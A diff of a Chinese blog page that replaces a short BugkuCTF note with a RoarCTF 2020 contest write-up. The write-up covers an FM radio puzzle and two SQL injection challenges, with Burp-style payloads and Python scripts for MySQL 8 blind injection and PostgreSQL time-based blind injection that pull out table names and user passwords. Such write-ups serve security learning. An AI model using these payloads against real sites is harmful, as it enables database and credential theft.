@@ -23,24 +23,21 @@
     var CONFIG = {"hostname":"yq1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="学会POST传参">
+  <meta name="description" content="跟着太空人师傅一队，被带飞，spaceman太强辣！最终取得总积分26名，也得奖了很开心，只是现在还没说奖励是啥哈哈哈，放张图纪念一下嘿嘿     MISC FM   WEB ezsql 你能登陆吗&amp;你能登陆吗2">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BugkuCTF-web-web基础$_POST writeup">
-<meta property="og:url" content="http://yq1ng.github.io/z_post/BugkuCTF-web-web%E5%9F%BA%E7%A1%80$_POST%20writeup/index.html">
+<meta property="og:title" content="RORCTF2020 部分wp">
+<meta property="og:url" content="http://yq1ng.github.io/z_post/RORCTF2020%20%E9%83%A8%E5%88%86wp/index.html">
 <meta property="og:site_name" content="会下雪的晴天">
-<meta property="og:description" content="学会POST传参">
+<meta property="og:description" content="跟着太空人师傅一队，被带飞，spaceman太强辣！最终取得总积分26名，也得奖了很开心，只是现在还没说奖励是啥哈哈哈，放张图纪念一下嘿嘿     MISC FM   WEB ezsql 你能登陆吗&amp;你能登陆吗2">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190629163653290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2019062916385620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2019062916395998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
-<meta property="article:published_time" content="2019-06-29T08:40:15.000Z">
-<meta property="article:modified_time" content="2020-09-30T01:33:11.985Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201212213207921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2020-12-06T03:00:00.000Z">
+<meta property="article:modified_time" content="2020-12-12T14:03:04.509Z">
 <meta property="article:author" content="yq1ng">
-<meta property="article:tag" content="CTF WEB">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190629163653290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201212213207921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70">
 
-<link rel="canonical" href="http://yq1ng.github.io/z_post/BugkuCTF-web-web%E5%9F%BA%E7%A1%80$_POST%20writeup/">
+<link rel="canonical" href="http://yq1ng.github.io/z_post/RORCTF2020%20%E9%83%A8%E5%88%86wp/">
 
 
 <script id="page-configurations">
@@ -53,7 +50,7 @@
   };
 </script>
 
-  <title>BugkuCTF-web-web基础$_POST writeup | 会下雪的晴天</title>
+  <title>RORCTF2020 部分wp | 会下雪的晴天</title>
   
 
 
@@ -188,7 +185,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yq1ng.github.io/z_post/BugkuCTF-web-web%E5%9F%BA%E7%A1%80$_POST%20writeup/">
+    <link itemprop="mainEntityOfPage" href="http://yq1ng.github.io/z_post/RORCTF2020%20%E9%83%A8%E5%88%86wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/xiaoxin.jpg">
@@ -201,7 +198,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          BugkuCTF-web-web基础$_POST writeup
+          RORCTF2020 部分wp
         </h1>
 
         <div class="post-meta">
@@ -211,14 +208,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2019-06-29 16:40:15" itemprop="dateCreated datePublished" datetime="2019-06-29T16:40:15+08:00">2019-06-29</time>
+              <time title="创建时间：2020-12-06 11:00:00" itemprop="dateCreated datePublished" datetime="2020-12-06T11:00:00+08:00">2020-12-06</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-30 09:33:11" itemprop="dateModified" datetime="2020-09-30T09:33:11+08:00">2020-09-30</time>
+                <time title="修改时间：2020-12-12 22:03:04" itemprop="dateModified" datetime="2020-12-12T22:03:04+08:00">2020-12-12</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -226,7 +223,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">CTF做题记录</span></a>
+                  <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
                 </span>
             </span>
 
@@ -243,14 +240,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>85</span>
+              <span>4.7k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>8 分钟</span>
             </span>
 
         </div>
@@ -263,13 +260,39 @@
 
       
         <blockquote>
-<p>学会POST传参                                                                                   </p>
+<p>跟着太空人师傅一队，被带飞，spaceman太强辣！最终取得总积分26名，也得奖了很开心，只是现在还没说奖励是啥哈哈哈，放张图纪念一下嘿嘿<br><img src="https://img-blog.csdnimg.cn/20201212213207921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="积分"></p>
 </blockquote>
+<!-- TOC -->
+
+<ul>
+<li><a href="#misc">MISC</a><ul>
+<li><a href="#fm">FM</a></li>
+</ul>
+</li>
+<li><a href="#web">WEB</a><ul>
+<li><a href="#ezsql">ezsql</a></li>
+<li><a href="#%E4%BD%A0%E8%83%BD%E7%99%BB%E9%99%86%E5%90%97%E4%BD%A0%E8%83%BD%E7%99%BB%E9%99%86%E5%90%972">你能登陆吗&amp;你能登陆吗2</a></li>
+</ul>
+</li>
+</ul>
+<!-- /TOC -->
 <a id="more"></a>
-<hr>
-<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p><img src="https://img-blog.csdnimg.cn/20190629163653290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>打开链接，由题目可知及代码可知，该题是让我们用POST方式提交参数<br>打开火狐，用hackbar提交即可（右侧）点击RUN提交即可<br><img src="https://img-blog.csdnimg.cn/2019062916385620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="得到FLAG"><a href="#得到FLAG" class="headerlink" title="得到FLAG"></a>得到FLAG</h1><p><img src="https://img-blog.csdnimg.cn/2019062916395998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="FM"><a href="#FM" class="headerlink" title="FM"></a>FM</h2><p>Ubuntu下载gqrx，然后载入iq文件，将Filter width改为<code>WFM(mono)</code>接着start，去听声音，读出来的数字+字母即为flag</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><blockquote>
+<p>MySql8新版特性，使用tqble代替select<br>多谢M3师傅提醒</p>
+</blockquote>
+<p>fuzz过滤很多，最难顶的union select没了，空格可以<code>/**/</code>绕过，MySQL8.0新特性的table语句派上用场了，官方手册<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/">点此</a>，一顿操作发现怎么都需要得到表名才行，理论可以使用information库得到表，但是table语法不允许写任何where，也就造成数据太多，limit不易控制，一番探索发现<code>performance_schema.table_handles</code>，官方手册<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/performance-schema-system-variables.html#sysvar_performance_schema_max_table_handles">点此</a>，MySQL的性能模式架构，其中的<code>table_handles</code>记录了所有打开的表，用于公开表锁信息，官方手册<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/performance-schema-table-handles-table.html">点此</a><br>怎么得到当前库的所有表名？或者说flag的表名，我在此用了盲注，通过MySQL对于两个select查询结果的按位比较进行猜测flag表名，在GYCTF2020-ezsqli已经提到过这个，表名盲猜<code>flllag</code>，因为脚本写出来的时间较长索性直接bp手注盲测，猜测表名payload（pass盲注可出，库名用sqlmap跑的），本地测试table_handles有八个字段，按位比较猜测 f 开头的表名，出现多条符合条件的记录，取了第一个，本地可以看到很多记录是重复的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;AND&#x2F;**&#x2F;(&#39;TABLE&#39;,&#39;ctf&#39;,&#39;f&#39;,4,5,6,7,8)&lt;(table&#x2F;**&#x2F;performance_schema.table_handles&#x2F;**&#x2F;limit&#x2F;**&#x2F;$1$,1)#&amp;password&#x3D;gml666</span><br></pre></td></tr></table></figure>
+<p>接着测试表名，0-9a-z，每次手动加1，直到爆破的length相同，得到表名：f11114g</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;AND&#x2F;**&#x2F;(&#39;TABLE&#39;,&#39;ctf&#39;,&#39;f§1§&#39;,4,5,6,7,8)&lt;(table&#x2F;**&#x2F;performance_schema.table_handles&#x2F;**&#x2F;limit&#x2F;**&#x2F;10,1)#&amp;password&#x3D;gml666</span><br></pre></td></tr></table></figure>
+<p>最后flag脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># encoding:     utf-8</span><br><span class="line"># @Author:      yq1ng</span><br><span class="line"># @Date:        2020-12-5 13:00</span><br><span class="line"># @challenges： ROARCTF2020 ezsql</span><br><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;139.129.98.9:30003&#x2F;login.php&quot;</span><br><span class="line">data &#x3D; &#123;&quot;username&quot;:&quot;&quot;,&quot;password&quot;:&quot;gml666&quot;&#125;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">tbname &#x3D; &quot;&quot;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">for x in range(1,43):</span><br><span class="line">    for i in r&#39;flag&#123;0123456789bcdehijkmnopqrstuvwxyz-&#125;&#39;:</span><br><span class="line">        payload &#x3D; f&quot;admin&#39;AND&#x2F;**&#x2F;ascii(substr((table&#x2F;**&#x2F;f11114g&#x2F;**&#x2F;limit&#x2F;**&#x2F;1,1),&#123;x&#125;,1))&#x3D;&#123;ord(i)&#125;#&quot;</span><br><span class="line">        data[&quot;username&quot;] &#x3D; payload</span><br><span class="line">        print(data)</span><br><span class="line">        s &#x3D; requests.post(url, data &#x3D; data)</span><br><span class="line">        if &#39;success&#39; in s.text:</span><br><span class="line">            flag +&#x3D; i</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<h2 id="你能登陆吗-amp-你能登陆吗2"><a href="#你能登陆吗-amp-你能登陆吗2" class="headerlink" title="你能登陆吗&amp;你能登陆吗2"></a>你能登陆吗&amp;你能登陆吗2</h2><blockquote>
+<p>PostgreSQL 时间盲注<br>多谢Macchiato提醒</p>
+</blockquote>
+<p>应该是预期解，时间盲注（sqlmap来的基本语句），可以用一个脚本去跑</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"># encoding:     utf-8</span><br><span class="line"># @Author:      yq1ng</span><br><span class="line"># @Date:        2020-12-6</span><br><span class="line"># @challenges： ROARCTF2020 你能登陆吗</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;139.129.98.9:30007&quot;</span><br><span class="line">data &#x3D; &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;&quot;&#125;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line"></span><br><span class="line">def db():</span><br><span class="line">    db &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for s in r&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-&#123;&#125;@._&#39;:</span><br><span class="line">            data[&quot;password&quot;] &#x3D; &quot;admin&#39;&#x2F;**&#x2F;AND&#x2F;**&#x2F;6489&#x3D;(case&#x2F;**&#x2F;when(SUBSTR(current_database(),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;(select&#x2F;**&#x2F;1935&#x2F;**&#x2F;FROM&#x2F;**&#x2F;pg_sleep(5))&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end)--2&quot;.format(i, s)</span><br><span class="line">            s &#x3D; requests.post(url, data&#x3D;data)</span><br><span class="line">            time &#x3D; s.elapsed.total_seconds()</span><br><span class="line">            print(data)</span><br><span class="line">            if time &gt; 5:</span><br><span class="line">                db +&#x3D; s</span><br><span class="line">                print(db)</span><br><span class="line">                print(i)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def tables():</span><br><span class="line">    tables &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for s in r&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-&#123;&#125;@._&#39;:</span><br><span class="line">            data[&quot;password&quot;] &#x3D; &quot;username&#x3D;admin&amp;password&#x3D;admin&#39;&#x2F;**&#x2F;AND&#x2F;**&#x2F;6489&#x3D;(case&#x2F;**&#x2F;when(SUBSTR((SELECT&#x2F;**&#x2F;tablename&#x2F;**&#x2F;FROM&#x2F;**&#x2F;pg_tables&#x2F;**&#x2F;WHERE&#x2F;**&#x2F;schemaname&#x2F;**&#x2F;IN&#x2F;**&#x2F;(&#39;public&#39;)),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;(select&#x2F;**&#x2F;1935&#x2F;**&#x2F;FROM&#x2F;**&#x2F;pg_sleep(5))&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end)--2&quot;.format(</span><br><span class="line">                i, s)</span><br><span class="line">            s &#x3D; requests.post(url, data&#x3D;data)</span><br><span class="line">            time &#x3D; s.elapsed.total_seconds()</span><br><span class="line">            print(data)</span><br><span class="line">            if time &gt; 5:</span><br><span class="line">                tables +&#x3D; s</span><br><span class="line">                print(tables)</span><br><span class="line">                print(i)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def password():</span><br><span class="line">    password &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for s in r&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-&#123;&#125;@._&#39;:</span><br><span class="line">            data[&quot;password&quot;] &#x3D; &quot;username&#x3D;admin&amp;password&#x3D;admin&#39;&#x2F;**&#x2F;AND&#x2F;**&#x2F;6489&#x3D;(case&#x2F;**&#x2F;when(SUBSTR((select&#x2F;**&#x2F;password&#x2F;**&#x2F;from&#x2F;**&#x2F;public.users),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;)&#x2F;**&#x2F;then&#x2F;**&#x2F;(select&#x2F;**&#x2F;1935&#x2F;**&#x2F;FROM&#x2F;**&#x2F;pg_sleep(5))&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end)--2&quot;.format(</span><br><span class="line">                i, s)</span><br><span class="line">            s &#x3D; requests.post(url, data&#x3D;data)</span><br><span class="line">            time &#x3D; s.elapsed.total_seconds()</span><br><span class="line">            print(data)</span><br><span class="line">            if time &gt; 5:</span><br><span class="line">                password +&#x3D; s</span><br><span class="line">                print(password)</span><br><span class="line">                print(i)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	db()</span><br><span class="line">	tables()</span><br><span class="line">    password()</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -305,7 +328,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://yq1ng.github.io/z_post/BugkuCTF-web-web%E5%9F%BA%E7%A1%80$_POST%20writeup/" title="BugkuCTF-web-web基础$_POST writeup">http://yq1ng.github.io/z_post/BugkuCTF-web-web基础$_POST writeup/</a>
+    <a href="http://yq1ng.github.io/z_post/RORCTF2020%20%E9%83%A8%E5%88%86wp/" title="RORCTF2020 部分wp">http://yq1ng.github.io/z_post/RORCTF2020 部分wp/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -315,9 +338,6 @@
 
 
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/CTF-WEB/" rel="tag"><i class="fa fa-tag"></i> CTF WEB</a>
-          </div>
 
         
 
@@ -325,12 +345,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/z_post/BugkuCTF-web-web%E5%9F%BA%E7%A1%80$_GET%20writeup/" rel="prev" title="BugkuCTF-web-web基础$_GET writeup">
-      <i class="fa fa-chevron-left"></i> BugkuCTF-web-web基础$_GET writeup
+    <a href="/z_post/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96wp/" rel="prev" title="CTFshow 反序列化wp">
+      <i class="fa fa-chevron-left"></i> CTFshow 反序列化wp
     </a></div>
       <div class="post-nav-item">
-    <a href="/z_post/BugkuCTF-web-%E7%9F%9B%E7%9B%BE%20writeup/" rel="next" title="BugkuCTF-web-矛盾 writeup">
-      BugkuCTF-web-矛盾 writeup <i class="fa fa-chevron-right"></i>
+    <a href="/z_post/iseacms%E7%AE%80%E5%8D%95%E5%AE%A1%E8%AE%A1/" rel="next" title="iseacms简单审计">
+      iseacms简单审计 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -390,7 +410,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BE%97%E5%88%B0FLAG"><span class="nav-number">3.</span> <span class="nav-text">得到FLAG</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#FM"><span class="nav-number">1.1.</span> <span class="nav-text">FM</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezsql"><span class="nav-number">2.1.</span> <span class="nav-text">ezsql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E8%83%BD%E7%99%BB%E9%99%86%E5%90%97-amp-%E4%BD%A0%E8%83%BD%E7%99%BB%E9%99%86%E5%90%972"><span class="nav-number">2.2.</span> <span class="nav-text">你能登陆吗&amp;你能登陆吗2</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
